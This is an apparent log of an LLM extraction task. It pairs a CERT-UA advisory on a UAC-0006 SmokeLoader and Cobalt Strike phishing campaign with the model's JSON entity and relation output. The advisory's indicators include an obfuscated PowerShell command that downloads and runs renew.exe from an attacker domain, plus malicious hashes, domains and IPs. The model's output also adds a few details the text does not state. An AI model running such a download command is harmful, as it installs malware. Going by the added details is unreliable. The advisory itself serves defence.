@@ -1,0 +1,389 @@
+=== REQUEST (gemini gemini-3.7-flash) ===
+--- sampling ---
+{"temperature":0}
+--- instructions ---
+### ROLE ###
+You are a high-precision information extraction engine for cybersecurity incident reports (CERT-UA). You convert one report into a structured JSON object. You are NOT given a list of entity categories: describe each entity instead, and the categories will be discovered downstream from your descriptions.
+
+### WHAT TO EXTRACT ###
+1. `entities`: every concrete, named thing that matters in the incident: threat actors and groups, malware and tools, software products and versions, vendors, companies, government bodies, sectors, countries, domains, IP addresses, e-mail addresses, file names, vulnerabilities (CVE ids), persons, infrastructure, campaigns, techniques. Each entity is { "name", "kind", "gloss" }.
+   - `name`: the entity exactly as written in the text (original script and spelling; do not translate names). Use the most complete form that appears.
+   - `kind`: a generic type phrase in English, 1–4 lower-case words, saying what kind of thing this is (e.g. "hacking group", "malware family", "software product", "software vendor", "government body", "internet domain", "country", "vulnerability identifier", "security advisory"). Use the same phrase for entities of the same kind. This is your own wording; there is no fixed list.
+   - `gloss`: ONE sentence in English, at most 25 words, saying WHAT KIND OF THING the entity is, in a way that would hold outside this report. Examples: "A Russian state-sponsored hacking group also known as APT28." / "A backdoor malware family delivered through malicious Office documents." / "A Ukrainian central executive body responsible for communications and information protection." / "An internet domain used to host a phishing page." Do NOT restate what the entity did in this incident beyond what is needed to say what it is.
+2. `relations`: relationships STATED OR CLEARLY IMPLIED in the text between two extracted entities, as { "head", "type", "tail", "evidence" }.
+   - `head` / `tail` MUST exactly match `name` values from `entities`. Direction: head acts on tail.
+   - `type`: a short lower-case verb phrase with hyphens, in your own words, as specific as the text allows (e.g. `distributes-via-email`, `communicates-with-c2`, `exploits-vulnerability-in`). There is no fixed list; choose the phrase that best names the relationship.
+   - `evidence`: a short verbatim fragment of the text (at most 15 words) supporting the relation.
+   - Do NOT invent relations the text does not support. Few or no relations is a correct answer. Do NOT add a relation for every co-occurring pair.
+3. `newRelationTypes`: [{ "name", "definition" }] — one entry with a one-line definition for EVERY relation type you used in this report.
+
+### RULES ###
+- Do NOT extract "CERT-UA" itself (the reporting body), and do not extract generic technologies ("the internet", "computers", "e-mail") unless they name a specific system.
+- Deduplicate: one entry per distinct entity (the same thing written two ways is one entity; use the most complete form in `name`).
+- If a government body's name contains a country, also extract that country as its own entity.
+- Do not assign roles; `kind` and `gloss` together carry what the thing is.
+
+### FINAL OUTPUT FORMAT ###
+First think through the report in free form (who did what to whom, with which tools). Keep this BRIEF and do NOT use curly braces { } anywhere in it. Then output a single raw JSON object: { "entities": [...], "relations": [...], "newRelationTypes": [...] }. No markdown code fences, no commentary after the JSON. If nothing is found: { "entities": [], "relations": [], "newRelationTypes": [] }.
+
+Apply these instructions to the report in the user's next message.
+
+--- text ---
+<p><strong>Загальна інформація</strong></p><p>Урядовою командою реагування на комп'ютерні надзвичайні події України CERT-UA 29.05.2023 зафіксовано чергову кампанію з розповсюдження шкідливої програми SmokeLoader. Так, для відправки електронних листів застосовуються легітимні скомпрометовані електронні поштові скриньки, а доставка SmokeLoader на ЕОМ здійснюється декількома способами, зокрема:</p><ul><li> EML -&gt; ZIP -&gt; HTML (JavaScript) -&gt; ZIP -&gt; JavaScript (завантажувач) -&gt; EXE -&gt; SmokeLoader</li><li> EML -&gt; RAR -&gt; VHDX -&gt; JavaScript (завантажувач) -&gt; EXE -&gt; SmokeLoader</li><li> EML -&gt; RAR -&gt; VHD -&gt; JavaScript (завантажувач) -&gt; EXE -&gt; SmokeLoader</li></ul><p>При цьому, вірогідно, завдяки помилці атакуючих, в одному з VHDX-файлів (серед видалених файлів) виявлено виконуваний файл "Заява шахрайська операція СІРІОН.scr" (MD5: c901c23016390f8edb3799b5f1b98e2c), що є шкідливою програмою Cobalt Strike Beacon.</p><p>Відзначаємо низку змін в тактиках, техніках і процедурах UAC-0006:&nbsp;</p><ul><li> використання декількох ланцюгів ураження;</li><li> розповсюджуваний зразок SmokeLoader містить 26 URL-адрес серверу управління бот-мережею (переважна більшість доменів не зареєстрована);</li><li> виявлення шкідливої програми Cobalt Strike Beacon може свідчити про розширення переліку використовуваного угрупуванням інструментарію.</li></ul><p>Для реєстрації доменних імен та розміщення серверів управління бот-мережею зловмисники використовують російських реєстраторів доменних імен та провайдерів: @reg.ru, @nic.ru, @iqhost.ru, @macloud.ru, @cloudx.ru, які сприяють реалізації зловмисного задуму.</p><p>Вкотре нагадуємо, що для запуску JavaScript-завантажувача, який забезпечить доставку і запуск SmokeLoader, використовується Windows Script Host (wscript.exe, cscript.exe) у зв'язку з чим, з метою зменшення поверхні атаки, рекомендуємо обмежити можливість використання цієї технології на ЕОМ.</p><p><em>Довідково: в результаті атаки 05.05.2023 шкідливою програмою SmokeLoader було успішно інфіковано близько 1100 ЕОМ.</em></p><p><br></p><p><strong>Індикатори кіберзагроз</strong></p><p><em>Файли:</em></p><pre class="ql-syntax" spellcheck="false">07b0f47e2c9fadf6bb742405b1fa712c&nbsp; &nbsp; c32974b865152c6ca3c5f0cc787319dfc2b32ea1bebc1f37f6c36d2ca75439c8&nbsp; &nbsp; акт_звірки_та_рахунки.html&nbsp;
+3572d45b0c17ed8c04f82065bf1a5e78&nbsp; &nbsp; b9e7780b1bf98b1f2e0fd25c793530891bbb678da743be6229d3466234c9e56c&nbsp; &nbsp; акт_звірки_та_рахунки.zip
+c5ba8159cbb49d89e0fb07b5a93c507b&nbsp; &nbsp; 51073b3884699eb4779004ab08d793635f3913c36139bce9ff0aead9f383849c&nbsp; &nbsp; рахунок_№415_2023.js
+d26bfee018dbdc10328acaf307191f43&nbsp; &nbsp; 5c85249d375a3a38e87a45857c069c6710caef1e521194eed1b4c1ff463e5b0b&nbsp; &nbsp; акт_звірки_рахунки.zip&nbsp;
+c912edceb30ca0beb505f31f022690b4&nbsp; &nbsp; 24b94fed39c67b5a4f6675dc944b1a17914a90d218432d0aa8714442f6fa77eb&nbsp; &nbsp; Акти_та_рахунки.rar&nbsp;
+4fd9c773b8c4683dfe0ef18c43c2f7e7&nbsp; &nbsp; 4eb777f90399df3c658181550b02a247b2ce45546bd576b8b8c222946bb17c01&nbsp; &nbsp; Акти_та_рахунки.vhd
+d38ac2b423950804939b84f744f9de41&nbsp; &nbsp; ef3fad88a7ffd4ea39152f0f190db38afdeac256ddfde0ac3a1369c4744357c0&nbsp; &nbsp; Акри та рахунки.rar&nbsp;
+b863109ee783cfa0617c7a8fd8366f32&nbsp; &nbsp; 81c074fa84dc8637740e77ac8b4fe1b64d7da74f1c2b8bc56d14fcbb633829cc&nbsp; &nbsp; Акри та рахунки.vhdx
+c901c23016390f8edb3799b5f1b98e2c&nbsp; &nbsp; 88f8249b22062a36a7cc170ce9de943b6cd73ce7bf6625a0572b46def686baac&nbsp; &nbsp; Заява шахрайська операція СІРІОН.scr (Cobalt Strike Beacon)
+d3c40297c31d14939e2781a353c8f087&nbsp; &nbsp; ce371d4ab4c782ca2db441c723ceafbf05b6d6ae0234469747288dcecf2eafbc&nbsp; &nbsp; $RSEJRGK.zip
+6626cd1ffce52c4234c271e5e4e3a603&nbsp; &nbsp; 31648abf13e3e9e96ffa8ef6361473a72cc6e5e1ac170f26df558155a76cf9fb&nbsp; &nbsp; $R1STAWU.zip
+e0ffa7d71c70c4ef2cddf0fa8d951128&nbsp; &nbsp; 6667500156d0b0d81fb98d32794c8c50de82fc915d2a59780e9b6e1b9f78ada7&nbsp; &nbsp; renew.exe
+42ab13a5f832f542d18083839671b340&nbsp; &nbsp; d3fe939abc37519cf9968874270d356abd8b10887ce7e78a5fb1624d288f14b8&nbsp; &nbsp; smoke.exe (SmokeLoader)
+</pre><p><em>Хостові:</em></p><pre class="ql-syntax" spellcheck="false">%LOCALAPPDATA%\TempuwN57.exe
+cmd.exe /c pO^wErshEll -executionpolicy bypass -noprofile -w hidden $v1='Net.We'; $v2='bClient'; $var = (New-Object $v1$v2); $var.Headers['User-Agent'] = 'Google Chrome'; $var.downloadfile('hxxp://premiumjeck[.]site/one/renew.exe','%temp%uwN57.exe');
+</pre><p><em>Мережеві:</em></p><pre class="ql-syntax" spellcheck="false">176[.]124.193.111 (RU; @cloudx.ru)
+193[.]106.174.215 (RU; @iqhost.ru)
+23[.]230.13.93 (US; @egihosting.com)
+77[.]232.37.148 (RU; @macloud.ru)
+93[.]185.166.142 (NL; @stark-industries.solutions)
+viktor@promarma.com.ua
+lamazone[.]site (2023-05-12; RU; @reg.ru)
+polinamailserverip[.]ru (2023-05-12; RU; @nic.ru)&nbsp; &nbsp;
+alegoomaster[.]com
+azartnyjboy[.]com
+criticalosl[.]tech
+droopily[.]eu
+filterfullproperty[.]ru
+freesitucionap[.]com
+gondurasonline[.]ug
+hopentools[.]site
+humanitarydp[.]ug
+infomalilopera[.]ru
+jkghdj2993jdjjdjd[.]ru
+jskgdhjkdfhjdkjhd844[.]ru
+kismamabeforyougo[.]com
+kissmafiabeforyoudied[.]eu
+kjhgdj99fuller[.]ru
+maximprofile[.]net
+nabufixservice[.]name
+premiumjeck[.]site
+prostotaknet[.]net
+verycheap[.]store
+viktor@promarma.com.ua
+zaikaopentra-com-ug[.]online
+zaikaopentra.com[.]ug
+zakolibal[.]online
+zalamafiapopcultur[.]eu
+zaliphone[.]com
+hXXp://premiumjeck[.]site/one/renew.exe
+hXXp://93[.]185.166.142/en_US/all[.]js
+hXXp://93[.]185.166.142/submit[.]php
+hXXp://alegoomaster[.]com/
+hXXp://azartnyjboy[.]com/
+hXXp://criticalosl[.]tech/
+hXXp://droopily[.]eu/
+hXXp://filterfullproperty[.]ru/
+hXXp://freesitucionap[.]com/
+hXXp://gondurasonline[.]ug/
+hXXp://hopentools[.]site/
+hXXp://humanitarydp[.]ug/
+hXXp://infomalilopera[.]ru/
+hXXp://jkghdj2993jdjjdjd[.]ru/
+hXXp://jskgdhjkdfhjdkjhd844[.]ru/
+hXXp://kismamabeforyougo[.]com/
+hXXp://kissmafiabeforyoudied[.]eu/
+hXXp://kjhgdj99fuller[.]ru/
+hXXp://lamazone[.]site/
+hXXp://maximprofile[.]net/
+hXXp://nabufixservice[.]name/
+hXXp://polinamailserverip[.]ru/
+hXXp://prostotaknet[.]net/
+hXXp://verycheap[.]store/
+hXXp://zaikaopentra-com-ug[.]online/
+hXXp://zaikaopentra.com[.]ug/
+hXXp://zakolibal[.]online/
+hXXp://zalamafiapopcultur[.]eu/
+hXXp://zaliphone[.]com/
+Google Chrome (User-Agent)
+</pre><p><br></p><p><strong>Графічні зображення</strong></p><p></p><p>Рис.1 Ланцюг ураження SmokeLoader з використанням HTML-файлу</p><p></p><p>Рис.2 Ланцюг ураження SmokeLoader з використанням VHD(X)-файлу</p>
+
+=== RESPONSE (11.9s, in 4140 / out 2889 tok, STOP) ===
+UAC-0006 conducted a cyber attack campaign distributing SmokeLoader and Cobalt Strike Beacon using email lure archives containing scripts and disk images, hosted across several Russian and international hosting providers and registrars.
+
+{
+  "entities": [
+    {
+      "name": "SmokeLoader",
+      "kind": "malware family",
+      "gloss": "A modular malicious software family used primarily as a loader to download and execute additional malware payloads."
+    },
+    {
+      "name": "Cobalt Strike Beacon",
+      "kind": "malware family",
+      "gloss": "A post-exploitation agent and component of the Cobalt Strike commercial penetration testing platform."
+    },
+    {
+      "name": "UAC-0006",
+      "kind": "threat actor",
+      "gloss": "A financially motivated cyber threat group known for deploying SmokeLoader to compromise banking and accounting systems."
+    },
+    {
+      "name": "Windows Script Host",
+      "kind": "software product",
+      "gloss": "A Microsoft Windows scripting host environment that allows execution of scripts in various languages such as VBScript and JScript."
+    },
+    {
+      "name": "wscript.exe",
+      "kind": "software product",
+      "gloss": "An executable file of Windows Script Host used to run scripts within Microsoft Windows."
+    },
+    {
+      "name": "cscript.exe",
+      "kind": "software product",
+      "gloss": "A command-line version of Windows Script Host used to execute scripts in Windows."
+    },
+    {
+      "name": "reg.ru",
+      "kind": "company",
+      "gloss": "A major Russian domain name registrar and web hosting service provider."
+    },
+    {
+      "name": "nic.ru",
+      "kind": "company",
+      "gloss": "A Russian domain name registrar and web hosting provider, also known as RU-CENTER."
+    },
+    {
+      "name": "iqhost.ru",
+      "kind": "company",
+      "gloss": "A Russian hosting and server infrastructure provider."
+    },
+    {
+      "name": "macloud.ru",
+      "kind": "company",
+      "gloss": "A Russian cloud server and hosting infrastructure provider."
+    },
+    {
+      "name": "cloudx.ru",
+      "kind": "company",
+      "gloss": "A Russian cloud hosting and infrastructure service provider."
+    },
+    {
+      "name": "egihosting.com",
+      "kind": "company",
+      "gloss": "A web hosting and dedicated server provider based in the United States."
+    },
+    {
+      "name": "stark-industries.solutions",
+      "kind": "company",
+      "gloss": "A hosting and infrastructure provider registered in the Netherlands."
+    },
+    {
+      "name": "Україна",
+      "kind": "country",
+      "gloss": "A sovereign state in Eastern Europe."
+    },
+    {
+      "name": "акт_звірки_та_рахунки.html",
+      "kind": "malicious file",
+      "gloss": "A malicious HTML file containing JavaScript used to drop and execute malware."
+    },
+    {
+      "name": "акт_звірки_та_рахунки.zip",
+      "kind": "malicious file",
+      "gloss": "A malicious ZIP archive used in email phishing attachments."
+    },
+    {
+      "name": "рахунок_№415_2023.js",
+      "kind": "malicious file",
+      "gloss": "A malicious JavaScript loader file designed to download and execute SmokeLoader."
+    },
+    {
+      "name": "акт_звірки_рахунки.zip",
+      "kind": "malicious file",
+      "gloss": "A malicious ZIP archive used in phishing email delivery chains."
+    },
+    {
+      "name": "Акти_та_рахунки.rar",
+      "kind": "malicious file",
+      "gloss": "A malicious RAR archive containing disk images and script loaders."
+    },
+    {
+      "name": "Акти_та_рахунки.vhd",
+      "kind": "malicious file",
+      "gloss": "A malicious virtual hard disk image file containing malicious script components."
+    },
+    {
+      "name": "Акри та рахунки.rar",
+      "kind": "malicious file",
+      "gloss": "A malicious RAR archive distributing disk image payloads."
+    },
+    {
+      "name": "Акри та рахунки.vhdx",
+      "kind": "malicious file",
+      "gloss": "A malicious virtual hard disk file containing payload files."
+    },
+    {
+      "name": "Заява шахрайська операція СІРІОН.scr",
+      "kind": "malicious file",
+      "gloss": "An executable screensaver file containing a Cobalt Strike Beacon payload."
+    },
+    {
+      "name": "$RSEJRGK.zip",
+      "kind": "malicious file",
+      "gloss": "A malicious ZIP archive extracted during infection."
+    },
+    {
+      "name": "$R1STAWU.zip",
+      "kind": "malicious file",
+      "gloss": "A malicious ZIP archive dropped or extracted during the infection chain."
+    },
+    {
+      "name": "renew.exe",
+      "kind": "malicious file",
+      "gloss": "A malicious executable payload dropped to facilitate SmokeLoader deployment."
+    },
+    {
+      "name": "smoke.exe",
+      "kind": "malicious file",
+      "gloss": "A malicious executable implementing the SmokeLoader payload."
+    },
+    {
+      "name": "viktor@promarma.com.ua",
+      "kind": "email address",
+      "gloss": "A compromised legitimate email address used to distribute malicious emails."
+    },
+    {
+      "name": "176.124.193.111",
+      "kind": "ip address",
+      "gloss": "An IP address used for malicious command and control infrastructure hosted on CloudX."
+    },
+    {
+      "name": "193.106.174.215",
+      "kind": "ip address",
+      "gloss": "An IP address used for malicious command and control infrastructure hosted on IQHost."
+    },
+    {
+      "name": "23.230.13.93",
+      "kind": "ip address",
+      "gloss": "An IP address used for malicious infrastructure hosted on EGIHosting."
+    },
+    {
+      "name": "77.232.37.148",
+      "kind": "ip address",
+      "gloss": "An IP address used for malicious command and control infrastructure hosted on Macloud."
+    },
+    {
+      "name": "93.185.166.142",
+      "kind": "ip address",
+      "gloss": "An IP address used to host malicious scripts and server infrastructure."
+    },
+    {
+      "name": "lamazone.site",
+      "kind": "internet domain",
+      "gloss": "A domain name registered with Reg.ru used as command and control infrastructure."
+    },
+    {
+      "name": "polinamailserverip.ru",
+      "kind": "internet domain",
+      "gloss": "A domain name registered with NIC.ru used as command and control infrastructure."
+    },
+    {
+      "name": "premiumjeck.site",
+      "kind": "internet domain",
+      "gloss": "A domain name used for hosting malicious executable files."
+    }
+  ],
+  "relations": [
+    {
+      "head": "UAC-0006",
+      "type": "distributes-malware",
+      "tail": "SmokeLoader",
+      "evidence": "розповсюджуваний зразок SmokeLoader містить 26 URL-адрес серверу управління"
+    },
+    {
+      "head": "UAC-0006",
+      "type": "uses-malware",
+      "tail": "Cobalt Strike Beacon",
+      "evidence": "виявлення шкідливої програми Cobalt Strike Beacon може свідчити про розширення переліку використовуваного угрупуванням інструментарію"
+    },
+    {
+      "head": "UAC-0006",
+      "type": "uses-infrastructure-service",
+      "tail": "reg.ru",
+      "evidence": "зловмисники використовують російських реєстраторів доменних імен та провайдерів: @reg.ru"
+    },
+    {
+      "head": "UAC-0006",
+      "type": "uses-infrastructure-service",
+      "tail": "nic.ru",
+      "evidence": "зловмисники використовують російських реєстраторів доменних імен та провайдерів: @reg.ru, @nic.ru"
+    },
+    {
+      "head": "UAC-0006",
+      "type": "uses-infrastructure-service",
+      "tail": "iqhost.ru",
+      "evidence": "зловмисники використовують російських реєстраторів доменних імен та провайдерів: @reg.ru, @nic.ru, @iqhost.ru"
+    },
+    {
+      "head": "UAC-0006",
+      "type": "uses-infrastructure-service",
+      "tail": "macloud.ru",
+      "evidence": "зловмисники використовують російських реєстраторів доменних імен та провайдерів: @reg.ru, @nic.ru, @iqhost.ru, @macloud.ru"
+    },
+    {
+      "head": "UAC-0006",
+      "type": "uses-infrastructure-service",
+      "tail": "cloudx.ru",
+      "evidence": "зловмисники використовують російських реєстраторів доменних імен та провайдерів: @reg.ru, @nic.ru, @iqhost.ru, @macloud.ru, @cloudx.ru"
+    },
+    {
+      "head": "Заява шахрайська операція СІРІОН.scr",
+      "type": "delivers-malware",
+      "tail": "Cobalt Strike Beacon",
+      "evidence": "Заява шахрайська операція СІРІОН.scr (MD5: c901c23016390f8edb3799b5f1b98e2c), що є шкідливою програмою Cobalt Strike Beacon"
+    },
+    {
+      "head": "smoke.exe",
+      "type": "delivers-malware",
+      "tail": "SmokeLoader",
+      "evidence": "smoke.exe (SmokeLoader)"
+    },
+    {
+      "head": "Windows Script Host",
+      "type": "executes-tool",
+      "tail": "wscript.exe",
+      "evidence": "використовується Windows Script Host (wscript.exe, cscript.exe)"
+    },
+    {
+      "head": "Windows Script Host",
+      "type": "executes-tool",
+      "tail": "cscript.exe",
+      "evidence": "використовується Windows Script Host (wscript.exe, cscript.exe)"
+    }
+  ],
+  "newRelationTypes": [
+    {
+      "name": "distributes-malware",
+      "definition": "The threat actor delivers or circulates a specified malware family in a campaign."
+    },
+    {
+      "name": "uses-malware",
+      "definition": "The threat actor employs a specific malware or tool in its operations."
+    },
+    {
+      "name": "uses-infrastructure-service",
+      "definition": "The threat actor utilizes services provided by a hosting company or registrar."
+    },
+    {
+      "name": "delivers-malware",
+      "definition": "The file implements, delivers, or instantiates a malware family payload."
+    },
+    {
+      "name": "executes-tool",
+      "definition": "The framework or software product provides and runs the specified executable component."
+    }
+  ]
+}
